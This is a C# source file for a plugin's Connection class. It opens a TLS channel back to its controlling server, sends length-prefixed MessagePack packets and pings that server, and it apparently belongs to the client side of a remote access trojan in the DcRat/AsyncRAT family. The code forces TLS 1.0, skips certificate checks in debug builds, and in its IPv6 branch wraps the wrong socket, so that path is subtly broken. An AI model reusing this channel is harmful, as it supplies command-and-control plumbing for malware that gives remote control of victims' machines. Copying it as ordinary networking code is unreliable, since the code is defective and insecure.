using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Connection
    {
        public static Socket TcpClient { get; set; }
        public static Socket TcpClientV6 { get; set; }
        public static SslStream SslClient { get; set; }
        public static X509Certificate2 ServerCertificate { get; set; }
        public static bool IsConnected { get; set; }
        public static bool IsConnectedV6 { get; set; }
        private static object SendSync { get; } = new object();
        public static string Hwid { get; set; }

        public static void InitializeClient(byte[] packet)
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 200 * 1024,
                    SendBufferSize = 200 * 1024,
                };
                TcpClientV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 200 * 1024,
                    SendBufferSize = 200 * 1024,
                };

                IPEndPoint remoteEndPoint = (IPEndPoint)Plugin.Socket.RemoteEndPoint;

                if (IPAddress.TryParse(remoteEndPoint.Address.ToString(), out IPAddress i4or6))
                {
                    switch (i4or6.AddressFamily)
                    {
                        case System.Net.Sockets.AddressFamily.InterNetwork:
                            TcpClient.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
                            if (TcpClient.Connected)
                            {
                                //Debug.WriteLine("plugins ipv4 connected");
                            }
                            break;
                        case System.Net.Sockets.AddressFamily.InterNetworkV6:
                            TcpClientV6.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
                            if (TcpClientV6.Connected)
                            {
                                //Debug.WriteLine("plugins ipv6 connected");
                            }
                            break;
                    }
                }
                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Plugin Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);

                    new Thread(() =>
                    {
                        Packet.Read();
                    }).Start();

                }
                else
                {
                    IsConnected = false;
                    if (TcpClientV6.Connected)
                    {
                        Debug.WriteLine("Plugin Connected!");
                        IsConnectedV6 = true;
                        SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                        SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);

                        new Thread(() =>
                        {
                            Packet.Read();
                        }).Start();

                    }
                    else
                    {
                        IsConnectedV6 = false;
                        return;
                    }
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                IsConnectedV6 = false;
                return;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return ServerCertificate.Equals(certificate);
        }

        public static void Disconnected()
        {

            try
            {
                IsConnected = false;
                IsConnectedV6 = false;
                SslClient?.Dispose();
                TcpClient?.Dispose();
                TcpClientV6?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null)
                    {
                        if (!IsConnectedV6)
                        {
                            return;
                        }
                        else
                        {
                            if (msg == null)
                            {
                                return;
                            }
                            else
                            {
                                goto next1;
                            }

                        }
                    }
                next1:
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    if (IsConnected)
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                    }
                    else
                    {
                        TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                    }
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                if (IsConnected)
                                {
                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                                }
                                else
                                {
                                    TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                                }
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();

                            }
                        }
                    }
                    else
                    {
                        if (IsConnected)
                        {
                            TcpClient.Poll(-1, SelectMode.SelectWrite);
                        }
                        else
                        {
                            TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                        }
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                    Debug.WriteLine("Plugin Packet Sent");
                }
                catch
                {
                    IsConnected = false;
                    IsConnectedV6 = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Ping!)";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }

    }
}
